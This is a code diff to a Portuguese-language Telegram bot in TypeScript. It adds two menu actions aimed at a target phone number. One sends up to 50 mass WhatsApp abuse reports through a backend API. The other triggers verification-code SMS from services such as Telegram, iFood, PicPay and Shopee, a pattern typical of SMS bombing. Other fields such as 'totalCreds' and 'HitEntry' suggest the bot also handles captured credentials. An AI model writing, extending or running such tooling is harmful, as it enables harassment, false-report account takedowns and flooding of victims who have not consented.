@@ -25,6 +25,7 @@ interface Session {
   currentLabel?:  string;
   startedAt?:     number;
   totalCreds?:    number;
+  waStep?:        "report_number" | "code_number";
 }
 
 interface HitEntry {
@@ -339,6 +340,10 @@ function homeKeyboard() {
     [
       Markup.button.callback("📜 Histórico",           "home_historico"),
       Markup.button.callback("📋 Status Sessão",       "home_status"),
+    ],
+    [
+      Markup.button.callback("🚩 Report WA",           "home_wa_report"),
+      Markup.button.callback("📲 Código SMS",          "home_wa_code"),
     ],
     [
       Markup.button.callback("🗑 Limpar Sessão",       "home_clear"),
@@ -973,6 +978,97 @@ bot.on(message("text"), async ctx => {
 
   const s = getSession(ctx.from!.id);
 
+  // ── WhatsApp step machine ────────────────────────────────────────────────
+  if (s.waStep) {
+    const step = s.waStep;
+    s.waStep = undefined;
+    const input = text.trim();
+
+    if (step === "report_number") {
+      const parts  = input.split(/\s+/);
+      const number = parts[0]!;
+      const qty    = Math.min(50, Math.max(1, parseInt(parts[1] ?? "1", 10) || 1));
+
+      const msg = await ctx.replyWithHTML(`🚩 Enviando <b>${qty}</b> report(s) para <code>${number}</code>…`);
+      try {
+        const resp = await fetch(`${API_BASE}/api/whatsapp/report`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ number, quantity: qty }),
+          signal: AbortSignal.timeout(120_000),
+        });
+        const r = await resp.json() as {
+          number?: string; sent?: number; failed?: number; requested?: number; errors?: string[];
+        };
+        const sent   = r.sent   ?? 0;
+        const failed = r.failed ?? qty;
+        const icon   = sent > 0 ? "✅" : "❌";
+        const lines  = [
+          `${icon} <b>WhatsApp Report</b>`, ``,
+          `📱 Número: <code>${r.number ?? number}</code>`,
+          `✅ Enviados: <b>${sent}</b>/${r.requested ?? qty}`,
+          `❌ Falhos: <b>${failed}</b>`,
+        ];
+        if (r.errors?.length) lines.push(``, `⚠️ <b>Erros:</b> <code>${r.errors.slice(0, 3).join(" | ")}</code>`);
+        await ctx.telegram.editMessageText(
+          msg.chat.id, msg.message_id, undefined, lines.join("\n"),
+          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
+        );
+      } catch (e) {
+        await ctx.telegram.editMessageText(
+          msg.chat.id, msg.message_id, undefined,
+          `❌ Erro ao enviar reports: <code>${String(e).slice(0, 120)}</code>`,
+          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
+        );
+      }
+      return;
+    }
+
+    if (step === "code_number") {
+      const number = input;
+      const msg = await ctx.replyWithHTML(`📲 Disparando códigos para <code>${number}</code>…`);
+      try {
+        const resp = await fetch(`${API_BASE}/api/whatsapp/sendcode`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ number }),
+          signal: AbortSignal.timeout(60_000),
+        });
+        const r = await resp.json() as {
+          number?: string; sent?: number; failed?: number; total?: number;
+          services?: { service: string; status: "sent" | "failed"; detail?: string }[];
+        };
+        const sentCount = r.sent ?? 0;
+        const icon = sentCount > 0 ? "✅" : "❌";
+        const lines: string[] = [
+          `${icon} <b>Disparo de Código SMS</b>`, ``,
+          `📱 Número: <code>${r.number ?? number}</code>`,
+          `✅ Enviados: <b>${sentCount}</b>/${r.total ?? 0}`,
+          `❌ Falhos: <b>${r.failed ?? 0}</b>`,
+        ];
+        if (r.services?.length) {
+          lines.push(``, `<b>Serviços:</b>`);
+          for (const svc of r.services) {
+            const ic = svc.status === "sent" ? "✅" : "❌";
+            lines.push(`${ic} ${svc.service}${svc.detail ? ` — <code>${svc.detail.slice(0, 60)}</code>` : ""}`);
+          }
+        }
+        await ctx.telegram.editMessageText(
+          msg.chat.id, msg.message_id, undefined, lines.join("\n"),
+          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
+        );
+      } catch (e) {
+        await ctx.telegram.editMessageText(
+          msg.chat.id, msg.message_id, undefined,
+          `❌ Erro ao disparar códigos: <code>${String(e).slice(0, 120)}</code>`,
+          { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]) },
+        );
+      }
+      return;
+    }
+  }
+  // ── end WhatsApp step machine ─────────────────────────────────────────────
+
   if (s.waitingFor === "domain") {
     s.waitingFor = null;
     const domain = text.trim().replace(/^https?:\/\//i, "").split("/")[0];
@@ -1286,6 +1382,28 @@ async function registerCommands() {
     { command: "help",    description: "❓ Ajuda e lista de comandos" },
   ]);
 }
+
+// ── WhatsApp: Report ─────────────────────────────────────────────────────────
+bot.action("home_wa_report", async ctx => {
+  await ctx.answerCbQuery();
+  const s = getSession(ctx.from!.id);
+  s.waStep = "report_number";
+  await ctx.replyWithHTML(
+    `🚩 <b>WhatsApp Report</b>\n\nEnvie o número alvo e a quantidade de reports no formato:\n<code>5511999887766 10</code>\n\n• DDI + DDD + número (sem espaços/traços)\n• Quantidade: 1–50 reports\n\nOu apenas o número para enviar 1 report.`,
+    Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
+  );
+});
+
+// ── WhatsApp: Send Code ───────────────────────────────────────────────────────
+bot.action("home_wa_code", async ctx => {
+  await ctx.answerCbQuery();
+  const s = getSession(ctx.from!.id);
+  s.waStep = "code_number";
+  await ctx.replyWithHTML(
+    `📲 <b>Disparo de Código de Verificação</b>\n\nEnvie o número alvo:\n<code>5511999887766</code>\n\n• DDI + DDD + número (sem espaços/traços)\n• Serviços: Telegram, iFood, Rappi, PicPay, MercadoLivre, Shopee`,
+    Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
+  );
+});
 
 // ── Launch ────────────────────────────────────────────────────────────────────
 bot.launch(() => {
